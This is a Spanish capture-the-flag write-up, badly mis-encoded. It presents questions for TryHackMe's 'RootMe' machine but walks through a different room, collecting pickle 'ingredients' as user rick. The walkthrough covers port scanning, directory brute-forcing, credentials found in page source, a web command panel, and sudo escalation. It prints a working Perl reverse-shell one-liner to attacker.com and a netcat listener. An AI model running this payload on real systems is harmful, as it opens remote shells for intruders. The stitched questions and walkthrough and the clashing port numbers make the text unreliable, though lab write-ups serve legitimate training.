I"ı4<p>La m√°quina RootMe, es una m√°quina de TryHackMe en la que mediante la explotaci√≥n de un servidor web conseguimos responder a las preguntas que nos plantean:</p>

<ul>
  <li>¬øCu√°ntos puertos est√°n abiertos?<br />
  *</li>
  <li>¬øQu√© versi√≥n de Apache est√° corriendo?<br />
  2.*.**</li>
  <li>¬øQu√© servicio corre en el puerto 22?<br />
  S**</li>
  <li>Mediante alguna herramienrta de numeraci√≥n encuentra directorios. ¬øCu√°l es el directorio oculto?<br />
  /p____/</li>
  <li>user.txt <br />
  THM{y<strong><em>***</em><em>_</em></strong>*l}</li>
  <li>Busca archivos que tengan permisos SUID. De ellos, ¬øcu√°l es el archivo raro?<br />                 /u<strong>/</strong>*/‚Äî‚Äì</li>
  <li>Encuentra una forma de escalar privilegios para encontrar root.txt <br />
  THM{p<strong>**</strong><strong>_</strong><strong>**</strong>*n}</li>
</ul>

<h1 id="enumeraci√≥n"><a href="#header-1"></a>Enumeraci√≥n</h1>

<p>La enumeraci√≥n se trata de una de las fases principales, en las que recolectamos la m√°xima informaci√≥n posible de la m√°quina v√≠ctima.</p>

<p>Usaremos nmap para analizar los puertos abiertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
</code></pre></div></div>

<ul>
  <li>
    <p>Escaneo todos los puertos abiertos -p- ‚Äìopen</p>
  </li>
  <li>
    <p>Mediante ‚Äìmin-rate 5000 indicamos que queremos emitir paquetes no m√°s lentos que 5000 paquetes por segundo.</p>
  </li>
  <li>
    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
  </li>
  <li>
    <p>Para que el escaneo no aplique resoluci√≥n DNS usamos -n</p>
  </li>
  <li>
    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.17.209 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-11 12:24 EDT
Initiating Connect Scan at 12:24
Scanning 10.10.17.209 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.17.209
Discovered open port 80/tcp on 10.10.17.209
Completed Connect Scan at 12:24, 14.03s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.17.209
Host is up, received user-set <span class="o">(</span>0.073s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-10-11 12:24:09 EDT <span class="k">for </span>14s
Not shown: 62896 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, 2637 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.09 seconds
</code></pre></div></div>

<p>El escaneo nos reporta dos puertos abiertos, el 22 y el 80, as√≠ como el servicio que corre en cada uno de ellos.</p>

<p>Debido a que el puerto 80 est√° abierto, entramos en la web con la $IP-VICTIMA. En ella no observamos mucha informaci√≥n por lo que inspeccionamos el c√≥digo de esta.</p>

<p>Tras una breve b√∫squeda hayamos un usuario.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Note to self, remember username!

Username: R<span class="k">**</span>kR<span class="k">**</span>s
</code></pre></div></div>

<p>Por otro lado, podemos usar alg√∫n buscador de directorios como pueden ser gobuster, dirsearch u otro. En mi caso utilizar√© gobuster. Para ello:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://<span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directoy-list1.0.txt
</code></pre></div></div>

<p>Buscamos los directorios de la $IP-VICTIMA usando el archivo de lista de palabras directory-list1.0.txt</p>

<p>En este punto podr√≠amos usar cualquier lista de palabras.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.17.209/
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 25
<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              php,html,txt
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2022/10/11 12:42:09 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 296]
/.htpasswd.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 300]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 296]
/.htpasswd.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 300]
/.htpasswd.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 301]
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 291]
/.htaccess.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 300]
/.hta.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 295]
/.htaccess.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 301]
/.htaccess.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 300]
/.hta.html            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 296]
/.hta.txt             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 295]
/a<span class="k">*****</span>               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.17.209/a<span class="k">*****</span>/]
/denied.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /l<span class="k">****</span>.php]                   
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1062]                                 
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1062]                                 
/l<span class="k">****</span>.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 882]                                  
/portal.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /l<span class="k">****</span>.php]                   
/r<span class="k">*****</span>.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17]                                   
/r<span class="k">*****</span>.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17]                                   
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 300]                                  
                                                                                 
<span class="o">===============================================================</span>
2022/10/11 12:42:46 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>Tras el an√°lisis entramos en http://$IP-VICTIMA/a‚Äî‚Äì pero no vemos nada interesante por lo que entramos en http://$IP-VICTIMA/r‚Äî‚Äì.txt y hayamos una cadena de texto que podr√≠a ser la conrase√±a del usuario antes hayado:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Wub<span class="k">*</span>al<span class="k">*</span>bb<span class="k">*</span><span class="nb">du</span><span class="k">*</span>dub
</code></pre></div></div>

<p>Otro de los directorios que hemos encontrado con gobuster nos proporciona una p√°gina de login. En ella probamos el usuario y contrase√±a que hemos adquirido y entramos!</p>

<p>Aparece una secci√≥n en la que podemos ajecutyar comandos. Intentamos listar el contenido con ls y aparece ‚ÄúSup3rS3cretPickl3Ingred.txt‚Äù. Intentamos abrirlo con cat pero no nos deja por lo que probamos otro comando como less. Encontramos as√≠ el primer ingrediente.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less Sup3rS3cretPickl3Ingred.txt
</code></pre></div></div>

<p>Seguimos investigando mediante comandos de navegacion. Con pwd vemos donde nos encontramos y llegamos a ver que dentro del usuario rick (podemos verlo mediante ls ../../../home/rick) se haya el segundo ingrediente pero no podemos abrirlo de ning√∫n modo.</p>

<h1 id="escalada-de-privilegios"><a href="$header-1"></a>Escalada de privilegios</h1>

<p>Ahora debemos obtener una reverse shell. Intentamos realizar una bash reverse shell pero no funciona por lo que lo intento con perl. Entramos en <a href="https://gtfobins.github.io/">gtfobins</a> para poder buscar la reverse shell con perl.</p>

<p>Desde la m√°quina atacante nos ponemos en escucha por el puerto 444 con nc:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4444
</code></pre></div></div>

<p>Por otro lado, desde la m√°quina v√≠ctima introducimos la perl reverse shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">RHOST</span><span class="o">=</span>attacker.com
<span class="nb">export </span><span class="nv">RPORT</span><span class="o">=</span>12345
perl <span class="nt">-e</span> <span class="s1">'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
</code></pre></div></div>

<p>Obtenemos as√≠ la reverse shell y podemos ejecutar comandos desde la m√°quina atacante.</p>

<p>Abrimos el archivo ‚Äúsecond ingredients‚Äù y obtenemos el segundo ingrediente.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="s1">'second ingredients'</span>
</code></pre></div></div>

<p>Con sudo -l podemos observar los permisos que tiene el usuario Rick a la hora de ejecutar comandos. En este caso podemos realizar todos los comandos como sudo por lo que listamos lo que hay en el usuario root mediante:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo ls</span> /root/ y vemos un archivo txt
</code></pre></div></div>

<p>Lo abrimos y obtenemos el √∫ltimo ingrediente!</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo cat</span> /root/3rd.txt
</code></pre></div></div>

<p>Muchas gracias por leer este writeup, espero que te haya gustado!</p>
:ET